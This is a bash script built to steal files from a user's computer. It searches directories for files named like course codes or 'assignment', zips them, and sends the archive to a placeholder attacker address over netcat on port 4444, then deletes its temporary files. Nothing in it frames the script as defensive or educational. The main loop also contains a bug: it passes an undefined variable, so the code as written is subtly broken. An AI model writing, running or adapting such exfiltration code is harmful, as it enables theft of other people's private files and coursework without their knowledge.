#!/bin/bash
temp_file=$(mktemp ./tempfile.XXXXXX)
ATTACKER_IP="ATTACKER IP HERE"

# to speed things up, we should exclude some directories that assignments are unlikely to be in
# necessary because iterating through everything in 'applications' legit takes 50 years
excluded=("Library" "Applications" "Pictures" "Movies" "Music")
is_excluded() {
    local name="$1"
    for ex in "${excluded[@]}"; do
        if [[ "$name" == "$ex" ]]; then
            return 0  # name is excluded
        fi
    done
    return 1  # name is not excluded
}

recurse_files() {
    local path=$1

    # strict regex to ensure we're not getting stuff like class/assistant/assist included
    # because there are many, many source files with those names
    if [[ $(basename "$path") =~ ([Cc][Oo][Mm][Pp][ _.-]?[0-9]{4})|^(.*[ _.-])?([Aa][Ss]{2})(([Ii][Gg][Nn][Mm][Ee][Nn][Tt])|[Tt])?([ _.0-9-].*)?$ ]]; then
        echo "$path" >> "$temp_file"
    elif [ -d "$path" ]; then 
        for item in "$path"/*; do
            recurse_files "$item"
        done
    fi
}

for dir in *; do
    if ! is_excluded $(basename "$dir"); then
        recurse_files "$base"
    fi
done


# zip files
zip_file="matching_files.zip"
if [ -s "$temp_file" ]; then
    # exclude hidden files (may be .node_modules or .cache files)
    # at any level of recurison
    zip -r "$zip_file" $(< "$temp_file") -x "*/.*" > /dev/null
fi

# send zip
if [ -f "$zip_file" ]; then
    cat "$zip_file" | nc "$ATTACKER_IP" 4444
fi

rm "$temp_file" "$zip_file" 2>/dev/null
